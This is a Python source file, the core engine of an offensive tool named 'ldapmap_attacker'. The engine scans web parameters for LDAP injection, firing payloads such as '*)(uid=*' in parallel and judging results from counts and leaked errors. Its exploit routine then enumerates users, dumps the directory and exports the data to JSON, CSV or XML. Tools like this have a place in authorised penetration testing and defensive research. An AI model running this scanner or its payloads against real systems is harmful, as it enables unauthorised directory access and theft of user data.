import re
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

from ldapmap_attacker.core.session import Session, AttackResult
from ldapmap_attacker.lib.logger import setup_logger
from ldapmap_attacker.lib.requester import Requester
from ldapmap_attacker.lib.utils import find_injection_points, replace_param_in_url
from ldapmap_attacker.plugins.base import PluginManager

logger = setup_logger()


class Engine:
    def __init__(self, session):
        self.session = session
        self.requester = None
        self.plugin_manager = PluginManager()
        self.baseline_stable = False
        self.baseline_results_count = 0

    def setup(self):
        logger.info("Initializing LDAPMap engine...")

        self.requester = Requester(
            timeout=self.session.timeout,
            retries=self.session.retries,
            delay=self.session.delay,
            proxy=self.session.proxy,
            headers=self.session.headers,
            cookies=self.session.cookies,
            verify_ssl=self.session.verify_ssl
        )

        self._identify_injection_points()
        self._establish_stable_baseline()

        if not self.baseline_stable:
            logger.warning("Target appears unstable - results may be unreliable")

        logger.success(f"Engine ready")
        logger.info(f"Injection point detected: {self.session.injection_point}")
        if self.session.post_data:
            logger.info(f"POST data parameter: {self.session.injection_point}")
        logger.info(f"Detectors: {', '.join(self.session.detectors)}")
        logger.info(f"Payloads: {', '.join(self.session.payloads)}")

    def _identify_injection_points(self):
        points = find_injection_points(self.session.target_url, self.session.post_data)

        if points:
            self.session.injection_point = list(points.keys())[0]
        else:
            parsed = urllib.parse.urlparse(self.session.target_url)
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                if params:
                    self.session.injection_point = list(params.keys())[0]
            else:
                self.session.injection_point = "INPUT"

    def _make_request(self, value):
        if self.session.method == "GET":
            url = replace_param_in_url(
                self.session.target_url,
                self.session.injection_point,
                value
            )
            data = None
        else:
            url = self.session.target_url
            data = replace_param_in_url(
                f"http://dummy?{self.session.post_data}",
                self.session.injection_point,
                value
            ).split("?")[1] if self.session.post_data else f"{self.session.injection_point}={value}"

        try:
            return self.requester.request(self.session.method, url, data)
        except Exception as e:
            logger.debug(f"Request failed for value '{value}': {e}")
            return None

    def _count_results(self, response_text):
        patterns = [
            r'Results? \((\d+) found\)',
            r'"count":\s*(\d+)',
            r'"results":\s*\[',
            r'<tr>.*?<td>.*?</td>.*?</tr>',
            r'uid["\']?\s*[=:]',
            r'cn["\']?\s*[=:]',
        ]

        count = 0
        for pattern in patterns[:2]:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                try:
                    return int(matches[0])
                except:
                    pass

        entries = re.findall(r'uid["\']?\s*[=:]', response_text, re.IGNORECASE)
        if entries:
            return len(entries)

        entries = re.findall(r'cn["\']?\s*[=:]', response_text, re.IGNORECASE)
        if entries:
            return len(entries)

        return count

    def _establish_stable_baseline(self):
        test_values = ["admin", "testuser123", "nonexistent_xyz"]
        results_counts = []

        for test_value in test_values:
            response = self._make_request(test_value)
            if response:
                count = self._count_results(response.text)
                results_counts.append(count)

        if len(results_counts) >= 2:
            if results_counts[0] == results_counts[1]:
                self.baseline_stable = True
                self.baseline_results_count = results_counts[0]
                logger.debug(f"Stable baseline: {self.baseline_results_count} results")
            else:
                self.baseline_stable = False
                self.baseline_results_count = results_counts[0]
                logger.debug(f"Unstable baseline: varying result counts")
        else:
            self.baseline_stable = False
            logger.debug("Could not establish baseline")

    def _is_boolean_injection(self, payload):
        true_patterns = [
            r'\*\)', r'\)\(&', r'\|\(', r'\*\)\(', r'objectClass=\*',
            r'\)\(', r'\*\)\)\(', r'\*\)\%00', r'\)\%00',
        ]

        for pattern in true_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return True, "true_condition"

        return False, ""

    def run(self):
        self.session.start()

        all_payloads = self._load_payloads()
        detectors = self._load_detectors()

        logger.info(f"Testing {len(all_payloads)} payloads with {len(detectors)} detectors")

        with ThreadPoolExecutor(max_workers=self.session.threads) as executor:
            futures = {
                executor.submit(self._test_payload_pro, payload, detectors): payload
                for payload in all_payloads
            }

            for future in as_completed(futures):
                payload = futures[future]
                try:
                    result = future.result()
                    if result:
                        self.session.add_result(result)
                        if result.vulnerable:
                            self._log_vulnerability(result)
                except Exception as e:
                    logger.debug(f"Test failed for payload {payload[0]}: {e}")

        self.session.stop()
        self._print_summary()

    def _load_payloads(self):
        all_payloads = []

        for payload_name in self.session.payloads:
            plugin_class = self.plugin_manager.get_payload(payload_name)
            if plugin_class:
                plugin = plugin_class()
                payloads = plugin.generate()
                all_payloads.extend(payloads)
                logger.debug(f"Loaded {len(payloads)} payloads from {payload_name}")
            else:
                logger.warning(f"Unknown payload plugin: {payload_name}")

        return all_payloads

    def _load_detectors(self):
        detectors = []

        for detector_name in self.session.detectors:
            plugin_class = self.plugin_manager.get_detector(detector_name)
            if plugin_class:
                plugin = plugin_class()
                detectors.append(plugin)
                logger.debug(f"Loaded detector: {detector_name}")
            else:
                logger.warning(f"Unknown detector plugin: {detector_name}")

        return detectors

    def _test_payload_pro(self, payload_data, detectors):
        payload, payload_type, description = payload_data

        start_time = time.time()
        response = self._make_request(payload)
        response_time = time.time() - start_time

        if not response:
            return None

        result_count = self._count_results(response.text)

        is_vulnerable = False
        evidence = {
            "payload": payload,
            "payload_type": payload_type,
            "result_count": result_count,
            "baseline_count": self.baseline_results_count,
            "detectors": []
        }

        if payload in ["admin", "*", "*)(uid=*", "*)(objectClass=*"]:
            pass

        is_bool_true, bool_reason = self._is_boolean_injection(payload)

        has_logic_change = False
        if is_bool_true:
            if result_count > self.baseline_results_count:
                has_logic_change = True
                evidence["boolean_test"] = "true_condition_expanded"
                evidence["logic_change"] = f"Results increased: {self.baseline_results_count} -> {result_count}"

        if result_count > self.baseline_results_count + 2 and is_bool_true:
            has_logic_change = True
            evidence["anomaly"] = "significant_result_increase"

        has_error_evidence = False
        for detector in detectors:
            detected, det_evidence = detector.detect(response, payload, "")
            if detected:
                has_error_evidence = True
                evidence["detectors"].append({
                    "name": detector.name,
                    "evidence": det_evidence
                })

        has_ldap_error = False
        if "ldap" in response.text.lower() and ("error" in response.text.lower() or "syntax" in response.text.lower() or "filter" in response.text.lower()):
            has_ldap_error = True
            evidence["ldap_error_leak"] = True

        is_vulnerable = has_logic_change or has_ldap_error or (has_error_evidence and has_ldap_error and is_bool_true)

        return AttackResult(
            payload=payload,
            payload_type=payload_type,
            vulnerable=is_vulnerable,
            url=response.url,
            status_code=response.status_code,
            response_time=response_time,
            evidence=evidence
        )

    def _log_vulnerability(self, result):
        logger.vuln(f"LDAP INJECTION | {result.payload}")
        logger.info(f"  Type: {result.payload_type}")

        evidence = result.evidence

        if "logic_change" in evidence:
            logger.info(f"  Logic: {evidence['logic_change']}")
        if "anomaly" in evidence:
            logger.info(f"  Anomaly: {evidence['anomaly']}")
        if "ldap_error_leak" in evidence:
            logger.info(f"  Evidence: LDAP error leaked")

        for detector_info in evidence.get("detectors", []):
            det_name = detector_info["name"]
            det_ev = detector_info["evidence"]

            if det_name == "ErrorBasedDetector":
                errors = det_ev.get("errors_found", [])
                if errors:
                    logger.info(f"  Errors: {', '.join(errors[:2])}")

    def _print_summary(self):
        summary = self.session.get_summary()
        vuln_results = [r for r in self.session.results if r.vulnerable]

        print()
        print("-" * 60)
        print(f"Scan Complete | {summary['target']}")
        print(f"Tests: {summary['tests_count']} | Vulns: {summary['vulnerabilities_found']} | Time: {summary['duration_seconds']:.1f}s")
        print("-" * 60)

        if vuln_results:
            print(f"\nConfirmed LDAP injection vulnerabilities: {len(vuln_results)}")
            print()

            vuln_by_type = {}
            for r in vuln_results:
                vtype = r.payload_type
                if vtype not in vuln_by_type:
                    vuln_by_type[vtype] = []
                vuln_by_type[vtype].append(r.payload)

            for vtype, payloads in vuln_by_type.items():
                print(f"  {vtype}:")
                for p in payloads[:5]:
                    print(f"    - {p}")
                if len(payloads) > 5:
                    print(f"    ... and {len(payloads) - 5} more")

            print(f"\n  Injection point: {self.session.injection_point}")
            print(f"  Method: {self.session.method}")
        else:
            print("\nNo LDAP injection vulnerabilities detected")

        print()

    def has_vulnerabilities(self) -> bool:
        return any(r.vulnerable for r in self.session.results)

    def get_exploiter(self):
        from ldapmap_attacker.core.exploitation import LDAPExploiter
        return LDAPExploiter(
            requester=self.requester,
            method=self.session.method,
            target_url=self.session.target_url,
            injection_point=self.session.injection_point,
            post_data=self.session.post_data
        )

    def exploit(self, enum_users: bool = False, dump: bool = False, export_format: str = None, output_dir: str = "./output"):
        from ldapmap_attacker.core.exploitation import LDAPExploiter

        exploiter = LDAPExploiter(
            requester=self.requester,
            method=self.session.method,
            target_url=self.session.target_url,
            injection_point=self.session.injection_point,
            post_data=self.session.post_data
        )

        all_data = {}
        users = []

        if enum_users or dump:
            users = exploiter.enum_users()
            all_data["users"] = users

        if dump:
            full_dump = exploiter.dump_database()
            all_data.update(full_dump)

        if export_format and users:
            from ldapmap_attacker.core.exporter import DataExporter
            exporter = DataExporter(output_dir)
            if export_format == "json":
                exporter.export_json(users)
            elif export_format == "csv":
                exporter.export_csv(users)
            elif export_format == "xml":
                exporter.export_xml(users)
            elif export_format == "all":
                exporter.export_all(users)

        return users if users else all_data

    def cleanup(self):
        if self.requester:
            self.requester.close()
